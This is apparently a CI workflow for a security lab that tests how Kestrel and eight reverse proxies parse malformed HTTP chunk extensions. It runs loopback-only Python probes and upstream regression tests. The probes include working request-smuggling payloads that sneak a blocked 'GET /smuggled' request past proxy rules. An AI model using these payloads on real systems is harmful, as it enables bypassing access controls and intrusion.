name: Kestrel chunk-extension lab

on:
  push:
    branches:
      - lab/kestrel-chunk-extensions-20260920
  pull_request:
    branches:
      - main

permissions:
  contents: read

jobs:
  probe:
    strategy:
      fail-fast: false
      matrix:
        include:
          - label: net10-10.0.12
            sdk: 10.0.401
            tfm: net10.0
          - label: net11-rc1
            sdk: 11.0.100-rc.1.26425.128
            tfm: net11.0
    runs-on: ubuntu-latest
    name: ${{ matrix.label }}
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: ${{ matrix.sdk }}

      - name: Build isolated localhost Kestrel harness
        shell: bash
        run: |
          set -euxo pipefail
          mkdir -p /tmp/kestrel-lab
          cat >/tmp/kestrel-lab/Lab.csproj <<EOF
          <Project Sdk="Microsoft.NET.Sdk.Web">
            <PropertyGroup>
              <TargetFramework>${{ matrix.tfm }}</TargetFramework>
              <ImplicitUsings>enable</ImplicitUsings>
              <Nullable>enable</Nullable>
            </PropertyGroup>
          </Project>
          EOF
          cat >/tmp/kestrel-lab/Program.cs <<'EOF'
          using System.Text;

          var builder = WebApplication.CreateBuilder(args);
          builder.WebHost.ConfigureKestrel(o => o.ListenLocalhost(5005));
          var app = builder.Build();

          app.Run(async context =>
          {
              using var body = new MemoryStream();
              await context.Request.Body.CopyToAsync(body);
              var bytes = body.ToArray();
              Console.WriteLine($"HIT method={context.Request.Method} path={context.Request.Path} bodyHex={Convert.ToHexString(bytes)}");
              context.Response.ContentType = "text/plain";
              await context.Response.WriteAsync($"{context.Request.Method} {context.Request.Path} body={Encoding.ASCII.GetString(bytes)}");
          });

          await app.RunAsync();
          EOF
          dotnet --info
          dotnet build /tmp/kestrel-lab/Lab.csproj -c Release

      - name: Run parser experiments over loopback only
        shell: bash
        run: |
          set -euxo pipefail
          cd /tmp/kestrel-lab
          dotnet run --no-build -c Release --project Lab.csproj >server.log 2>&1 &
          echo $! > server.pid
          cleanup() { kill "$(cat server.pid)" 2>/dev/null || true; }
          trap cleanup EXIT

          for i in {1..50}; do
            if curl -sS --max-time 1 http://127.0.0.1:5005/ready >/dev/null 2>&1; then break; fi
            sleep 0.2
          done

          cat >probe.py <<'PY'
          import json, socket, time

          HOST, PORT = "127.0.0.1", 5005

          cases = {
              "valid_token": b'1;a=b\r\n',
              "valid_quoted": b'1;a="b"\r\n',
              "valid_quoted_pair": b'1;a="b\\\\c"\r\n',
              "unclosed_quote": b'1;a="\r\n',
              "missing_name": b'1;\r\n',
              "missing_value": b'1;a=\r\n',
              "multiple_semicolons": b'1;;;\r\n',
              "nul_in_extension": b'1;\x00ext\r\n',
              "invalid_value_at": b'1;a=@\r\n',
              "bws_before_semicolon": b'1 ;a=b\r\n',
              "bare_lf_extension": b'1;a=b\n',
              "bare_cr_extension": b'1;a=b\rX\r\n',
          }

          def send_case(name, chunkline):
              first = (
                  b"POST /public HTTP/1.1\r\n"
                  b"Host: localhost\r\n"
                  b"Transfer-Encoding: chunked\r\n"
                  b"\r\n"
                  + chunkline
                  + b"X\r\n"
                  + b"0\r\n"
                  + b"\r\n"
              )
              second = (
                  b"GET /smuggled HTTP/1.1\r\n"
                  b"Host: localhost\r\n"
                  b"Connection: close\r\n"
                  b"\r\n"
              )
              s = socket.create_connection((HOST, PORT), timeout=3)
              s.settimeout(2)
              s.sendall(first + second)
              data = bytearray()
              while True:
                  try:
                      part = s.recv(65536)
                      if not part:
                          break
                      data.extend(part)
                  except socket.timeout:
                      break
              s.close()
              raw = bytes(data)
              result = {
                  "case": name,
                  "chunkline_hex": chunkline.hex(),
                  "http_responses": raw.count(b"HTTP/1.1 "),
                  "statuses": [
                      line.decode("latin1", "replace")
                      for line in raw.split(b"\r\n")
                      if line.startswith(b"HTTP/1.1 ")
                  ],
                  "contains_public_body": b"POST /public body=X" in raw,
                  "contains_smuggled_body": b"GET /smuggled body=" in raw,
                  "response_preview": raw[:800].decode("latin1", "replace"),
              }
              print(json.dumps(result, sort_keys=True))
              return result

          results = []
          for name, line in cases.items():
              results.append(send_case(name, line))
              time.sleep(0.1)

          with open("results.json", "w") as f:
              json.dump(results, f, indent=2, sort_keys=True)
          PY

          python3 probe.py | tee probe.out
          echo "=== SERVER LOG ==="
          cat server.log

      - name: Upload experiment results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: kestrel-chunk-extension-${{ matrix.label }}
          path: |
            /tmp/kestrel-lab/results.json
            /tmp/kestrel-lab/probe.out
            /tmp/kestrel-lab/server.log


  proxy-differential:
    runs-on: ubuntu-latest
    name: proxy-differential-net10
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: 10.0.401

      - name: Install local reverse proxies
        shell: bash
        run: |
          sudo apt-get update
          sudo apt-get install -y haproxy nginx

      - name: Build localhost Kestrel origin
        shell: bash
        run: |
          set -euxo pipefail
          mkdir -p /tmp/kestrel-proxy-lab
          cat >/tmp/kestrel-proxy-lab/Lab.csproj <<'EOF'
          <Project Sdk="Microsoft.NET.Sdk.Web">
            <PropertyGroup>
              <TargetFramework>net10.0</TargetFramework>
              <ImplicitUsings>enable</ImplicitUsings>
              <Nullable>enable</Nullable>
            </PropertyGroup>
          </Project>
          EOF
          cat >/tmp/kestrel-proxy-lab/Program.cs <<'EOF'
          var builder = WebApplication.CreateBuilder(args);
          builder.WebHost.ConfigureKestrel(o => o.ListenLocalhost(5005));
          var app = builder.Build();
          app.Run(async context =>
          {
              using var body = new MemoryStream();
              await context.Request.Body.CopyToAsync(body);
              Console.WriteLine($"ORIGIN_HIT method={context.Request.Method} path={context.Request.Path} bodyHex={Convert.ToHexString(body.ToArray())}");
              await context.Response.WriteAsync($"{context.Request.Method} {context.Request.Path}");
          });
          await app.RunAsync();
          EOF
          dotnet build /tmp/kestrel-proxy-lab/Lab.csproj -c Release

      - name: Configure HAProxy and nginx on loopback
        shell: bash
        run: |
          set -euxo pipefail
          cat >/tmp/haproxy-lab.cfg <<'EOF'
          global
              daemon
          defaults
              mode http
              timeout connect 3s
              timeout client 5s
              timeout server 5s
          frontend fe
              bind 127.0.0.1:5006
              http-request deny deny_status 403 if { path -i /smuggled }
              default_backend be
          backend be
              server origin 127.0.0.1:5005
          EOF

          cat >/tmp/nginx-lab.conf <<'EOF'
          events {}
          http {
            access_log /tmp/nginx-access.log;
            error_log /tmp/nginx-error.log info;
            server {
              listen 127.0.0.1:5007;
              location = /smuggled { return 403; }
              location / {
                proxy_http_version 1.1;
                proxy_request_buffering off;
                proxy_pass http://127.0.0.1:5005;
              }
            }
          }
          EOF

      - name: Run exact quoted-extension differential through origin and proxies
        shell: bash
        run: |
          set -euxo pipefail
          cd /tmp/kestrel-proxy-lab
          dotnet run --no-build -c Release --project Lab.csproj >origin.log 2>&1 &
          echo $! > origin.pid
          haproxy -f /tmp/haproxy-lab.cfg
          sudo nginx -c /tmp/nginx-lab.conf

          cleanup() {
            kill "$(cat origin.pid)" 2>/dev/null || true
            sudo nginx -s stop -c /tmp/nginx-lab.conf 2>/dev/null || true
            sudo pkill haproxy 2>/dev/null || true
          }
          trap cleanup EXIT
          sleep 1

          cat >proxy_probe.py <<'PY'
          import json, socket, time

          payload = (
              b"POST /public HTTP/1.1\r\n"
              b"Host: localhost\r\n"
              b"Transfer-Encoding: chunked\r\n"
              b"\r\n"
              b'1;a="\r\n'
              b"X\r\n"
              b"0\r\n"
              b"\r\n"
              b"GET /smuggled HTTP/1.1\r\n"
              b"Host: localhost\r\n"
              b"Content-Length: 11\r\n"
              b"Connection: close\r\n"
              b"\r\n"
              b'"\r\n'
              b"Y\r\n"
              b"0\r\n"
              b"\r\n"
          )

          valid = (
              b"POST /public HTTP/1.1\r\n"
              b"Host: localhost\r\n"
              b"Transfer-Encoding: chunked\r\n"
              b"Connection: close\r\n"
              b"\r\n"
              b"1;a=b\r\n"
              b"X\r\n"
              b"0\r\n"
              b"\r\n"
          )

          def send(port, data):
              s = socket.create_connection(("127.0.0.1", port), timeout=3)
              s.settimeout(3)
              s.sendall(data)
              out = bytearray()
              while True:
                  try:
                      p = s.recv(65536)
                      if not p: break
                      out.extend(p)
                  except socket.timeout:
                      break
              s.close()
              raw=bytes(out)
              return {
                  "responses": raw.count(b"HTTP/1.1 "),
                  "statuses": [x.decode("latin1") for x in raw.split(b"\r\n") if x.startswith(b"HTTP/1.1 ")],
                  "preview": raw[:1000].decode("latin1","replace")
              }

          results={}
          for label,port in [("direct",5005),("haproxy",5006),("nginx",5007)]:
              results[label]={"valid":send(port,valid),"quoted_poc":send(port,payload)}
              time.sleep(.2)
          print(json.dumps(results, indent=2, sort_keys=True))
          open("proxy-results.json","w").write(json.dumps(results, indent=2, sort_keys=True))
          PY

          python3 proxy_probe.py | tee proxy-probe.out
          sleep 1
          echo "=== ORIGIN ==="
          cat origin.log
          echo "=== NGINX ACCESS ==="
          cat /tmp/nginx-access.log || true
          echo "=== NGINX ERROR ==="
          cat /tmp/nginx-error.log || true

      - name: Upload proxy differential results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: kestrel-proxy-differential-net10
          path: |
            /tmp/kestrel-proxy-lab/proxy-results.json
            /tmp/kestrel-proxy-lab/proxy-probe.out
            /tmp/kestrel-proxy-lab/origin.log
            /tmp/nginx-access.log
            /tmp/nginx-error.log


  aspnetcore-main-regression:
    runs-on: ubuntu-latest
    timeout-minutes: 45
    name: aspnetcore-main-regression
    steps:
      - name: Clone ASP.NET Core main with submodules
        shell: bash
        run: |
          git clone --depth 1 --recurse-submodules --shallow-submodules https://github.com/dotnet/aspnetcore.git /tmp/aspnetcore

      - name: Restore repository toolchain
        shell: bash
        run: |
          cd /tmp/aspnetcore
          ./restore.sh

      - name: Run current-main Kestrel chunk-extension regression tests
        shell: bash
        run: |
          set -exo pipefail
          cd /tmp/aspnetcore
          set +u
          source ./activate.sh
          set -u
          dotnet test src/Servers/Kestrel/test/InMemory.FunctionalTests/InMemory.FunctionalTests.csproj \
            --filter "FullyQualifiedName~ChunkedRequestTests.RejectsInvalidChunkExtensions|FullyQualifiedName~ChunkedRequestTests.AllowsValidChunkExtensions" \
            --logger "console;verbosity=normal" | tee /tmp/aspnetcore-main-kestrel-tests.log

      - name: Upload current-main regression log
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: aspnetcore-main-kestrel-regression
          path: /tmp/aspnetcore-main-kestrel-tests.log


  more-frontends-net10:
    runs-on: ubuntu-latest
    timeout-minutes: 25
    name: more-frontends-net10
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: 10.0.401

      - name: Install Apache, Varnish, and Squid
        shell: bash
        run: |
          sudo apt-get update
          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y apache2 varnish squid
          sudo a2enmod proxy proxy_http >/dev/null

      - name: Build instrumented Kestrel origin
        shell: bash
        run: |
          set -euxo pipefail
          mkdir -p /tmp/frontends-lab
          cat >/tmp/frontends-lab/Lab.csproj <<'EOF'
          <Project Sdk="Microsoft.NET.Sdk.Web">
            <PropertyGroup>
              <TargetFramework>net10.0</TargetFramework>
              <ImplicitUsings>enable</ImplicitUsings>
              <Nullable>enable</Nullable>
            </PropertyGroup>
          </Project>
          EOF
          cat >/tmp/frontends-lab/Program.cs <<'EOF'
          var builder = WebApplication.CreateBuilder(args);
          builder.WebHost.ConfigureKestrel(o => o.ListenLocalhost(5005));
          var app = builder.Build();
          app.Run(async context =>
          {
              using var body = new MemoryStream();
              await context.Request.Body.CopyToAsync(body);
              var probe = context.Request.Headers["X-Probe"].ToString();
              Console.WriteLine($"ORIGIN_HIT probe={probe} method={context.Request.Method} path={context.Request.Path} bodyHex={Convert.ToHexString(body.ToArray())}");
              await context.Response.WriteAsync($"{context.Request.Method} {context.Request.Path}");
          });
          await app.RunAsync();
          EOF
          dotnet build /tmp/frontends-lab/Lab.csproj -c Release

      - name: Configure frontends
        shell: bash
        run: |
          set -euxo pipefail

          cat >/tmp/apache-lab.conf <<'EOF'
          ServerRoot "/etc/apache2"
          PidFile /tmp/apache-lab.pid
          Listen 127.0.0.1:5008
          ServerName localhost
          IncludeOptional mods-enabled/*.load
          IncludeOptional mods-enabled/*.conf
          User www-data
          Group www-data
          ErrorLog /tmp/apache-error.log
          LogLevel info
          CustomLog /tmp/apache-access.log combined
          ProxyRequests Off
          ProxyPass / http://127.0.0.1:5005/
          ProxyPassReverse / http://127.0.0.1:5005/
          <Location "/smuggled">
              Require all denied
          </Location>
          EOF

          cat >/tmp/varnish-lab.vcl <<'EOF'
          vcl 4.1;
          backend default {
              .host = "127.0.0.1";
              .port = "5005";
          }
          sub vcl_recv {
              if (req.url == "/smuggled") {
                  return (synth(403, "blocked"));
              }
              return (pass);
          }
          EOF

          cat >/tmp/squid-lab.conf <<'EOF'
          http_port 127.0.0.1:5010 accel vhost defaultsite=localhost
          cache_peer 127.0.0.1 parent 5005 0 no-query originserver name=origin
          acl blocked urlpath_regex ^/smuggled$
          http_access deny blocked
          http_access allow all
          cache_peer_access origin allow all
          access_log stdio:/tmp/squid-access.log
          cache_log /tmp/squid-cache.log
          pid_filename /tmp/squid-lab.pid
          coredump_dir /tmp
          EOF

          cat >/tmp/Caddyfile <<'EOF'
          :5011 {
              @blocked path /smuggled
              respond @blocked 403
              reverse_proxy 127.0.0.1:5005
          }
          EOF

          cat >/tmp/traefik-static.yml <<'EOF'
          entryPoints:
            web:
              address: ":5012"
          providers:
            file:
              filename: /etc/traefik/dynamic.yml
          log:
            level: INFO
          EOF

          cat >/tmp/traefik-dynamic.yml <<'EOF'
          http:
            routers:
              blocked:
                rule: 'Path(`/smuggled`)'
                entryPoints: [web]
                priority: 100
                middlewares: [denyall]
                service: origin
              normal:
                rule: 'PathPrefix(`/`)'
                entryPoints: [web]
                priority: 1
                service: origin
            middlewares:
              denyall:
                ipAllowList:
                  sourceRange:
                    - "192.0.2.0/24"
            services:
              origin:
                loadBalancer:
                  servers:
                    - url: "http://127.0.0.1:5005"
          EOF

          cat >/tmp/envoy-lab.yml <<'EOF'
          static_resources:
            listeners:
              - name: listener_0
                address:
                  socket_address:
                    address: 0.0.0.0
                    port_value: 5013
                filter_chains:
                  - filters:
                      - name: envoy.filters.network.http_connection_manager
                        typed_config:
                          "@type": type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager
                          stat_prefix: ingress_http
                          route_config:
                            name: local_route
                            virtual_hosts:
                              - name: local_service
                                domains: ["*"]
                                routes:
                                  - match:
                                      path: "/smuggled"
                                    direct_response:
                                      status: 403
                                  - match:
                                      prefix: "/"
                                    route:
                                      cluster: origin
                          http_filters:
                            - name: envoy.filters.http.router
                              typed_config:
                                "@type": type.googleapis.com/envoy.extensions.filters.http.router.v3.Router
            clusters:
              - name: origin
                connect_timeout: 1s
                type: STATIC
                load_assignment:
                  cluster_name: origin
                  endpoints:
                    - lb_endpoints:
                        - endpoint:
                            address:
                              socket_address:
                                address: 127.0.0.1
                                port_value: 5005
          EOF

      - name: Run frontend differential matrix
        shell: bash
        run: |
          set -euxo pipefail
          cd /tmp/frontends-lab
          dotnet run --no-build -c Release --project Lab.csproj >origin.log 2>&1 &
          echo $! > origin.pid

          sudo /usr/sbin/apache2 -f /tmp/apache-lab.conf -DFOREGROUND >/tmp/apache-stdout.log 2>&1 &
          echo $! > apache.pid
          sudo pkill varnishd 2>/dev/null || true
          sudo rm -rf /tmp/varnish-lab-instance
          sudo mkdir -p /tmp/varnish-lab-instance
          sudo varnishd -n /tmp/varnish-lab-instance -a 127.0.0.1:5009 -f /tmp/varnish-lab.vcl -s malloc,64m -F >/tmp/varnish.log 2>&1 &
          echo $! > varnish.pid
          sudo squid -z -f /tmp/squid-lab.conf >/tmp/squid-init.log 2>&1 || true
          sudo squid -N -f /tmp/squid-lab.conf >/tmp/squid-stdout.log 2>&1 &
          echo $! > squid.pid
          docker run --rm --network host --name caddy-lab -v /tmp/Caddyfile:/etc/caddy/Caddyfile:ro caddy:2 >/tmp/caddy.log 2>&1 &
          docker run --rm --network host --name traefik-lab -v /tmp/traefik-static.yml:/etc/traefik/traefik.yml:ro -v /tmp/traefik-dynamic.yml:/etc/traefik/dynamic.yml:ro traefik:v3 >/tmp/traefik.log 2>&1 &
          docker run --rm --network host --name envoy-lab -v /tmp/envoy-lab.yml:/etc/envoy/envoy.yaml:ro envoyproxy/envoy:v1.39.1 -c /etc/envoy/envoy.yaml >/tmp/envoy.log 2>&1 &

          cleanup() {
            kill "$(cat origin.pid)" 2>/dev/null || true
            sudo kill "$(cat apache.pid)" 2>/dev/null || true
            sudo kill "$(cat varnish.pid)" 2>/dev/null || true
            sudo kill "$(cat squid.pid)" 2>/dev/null || true
            docker rm -f caddy-lab traefik-lab envoy-lab >/dev/null 2>&1 || true
          }
          trap cleanup EXIT

          python3 - <<'PY'
          import socket,time
          for _ in range(120):
              ok=True
              for p in [5005,5008,5009,5010,5011,5012,5013]:
                  try:
                      s=socket.create_connection(("127.0.0.1",p),timeout=.2);s.close()
                  except Exception:
                      ok=False
              if ok: break
              time.sleep(.25)
          PY

          cat >frontends_probe.py <<'PY'
          import json, socket, time

          targets=[
              ("direct",5005),
              ("apache",5008),
              ("varnish",5009),
              ("squid",5010),
              ("caddy",5011),
              ("traefik",5012),
              ("envoy",5013),
          ]

          def payload(label, malformed=True):
              chunk = b'1;a="\r\n' if malformed else b"1;a=b\r\n"
              second = (
                  b"GET /smuggled HTTP/1.1\r\n"
                  b"Host: localhost\r\n"
                  + f"X-Probe: {label}\r\n".encode()
                  + b"Content-Length: 11\r\n"
                  b"Connection: close\r\n"
                  b"\r\n"
                  b'"\r\nY\r\n0\r\n\r\n'
              )
              return (
                  b"POST /public HTTP/1.1\r\n"
                  b"Host: localhost\r\n"
                  b"Transfer-Encoding: chunked\r\n"
                  + f"X-Probe: {label}-first\r\n".encode()
                  + (b"Connection: close\r\n" if not malformed else b"")
                  + b"\r\n"
                  + chunk + b"X\r\n0\r\n\r\n"
                  + (second if malformed else b"")
              )

          def send(port,data):
              s=socket.create_connection(("127.0.0.1",port),timeout=4)
              s.settimeout(4)
              s.sendall(data)
              out=bytearray()
              while True:
                  try:
                      part=s.recv(65536)
                      if not part: break
                      out.extend(part)
                  except socket.timeout:
                      break
              s.close()
              raw=bytes(out)
              return {
                  "responses":raw.count(b"HTTP/1.1 "),
                  "statuses":[x.decode("latin1","replace") for x in raw.split(b"\r\n") if x.startswith(b"HTTP/1.")],
                  "preview":raw[:1200].decode("latin1","replace")
              }

          results={}
          for label,port in targets:
              try:
                  results[label]={
                      "valid":send(port,payload(label+"-valid",False)),
                      "quoted_poc":send(port,payload(label,True)),
                  }
              except Exception as e:
                  results[label]={"error":repr(e)}
              time.sleep(.25)

          print(json.dumps(results,indent=2,sort_keys=True))
          open("frontends-results.json","w").write(json.dumps(results,indent=2,sort_keys=True))
          PY

          python3 frontends_probe.py | tee frontends-probe.out
          sleep 1
          echo "=== ORIGIN HITS ==="
          grep ORIGIN_HIT origin.log || true
          echo "=== APACHE ERROR ==="
          tail -100 /tmp/apache-error.log || true
          echo "=== VARNISH ==="
          tail -100 /tmp/varnish.log || true
          echo "=== SQUID ==="
          tail -100 /tmp/squid-cache.log || true
          echo "=== CADDY ==="
          tail -100 /tmp/caddy.log || true
          echo "=== TRAEFIK ==="
          tail -100 /tmp/traefik.log || true
          echo "=== ENVOY ==="
          tail -100 /tmp/envoy.log || true

      - name: Upload frontend matrix
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: kestrel-more-frontends-net10
          path: |
            /tmp/frontends-lab/frontends-results.json
            /tmp/frontends-lab/frontends-probe.out
            /tmp/frontends-lab/origin.log
            /tmp/apache-error.log
            /tmp/varnish.log
            /tmp/caddy.log
            /tmp/traefik.log
            /tmp/envoy.log
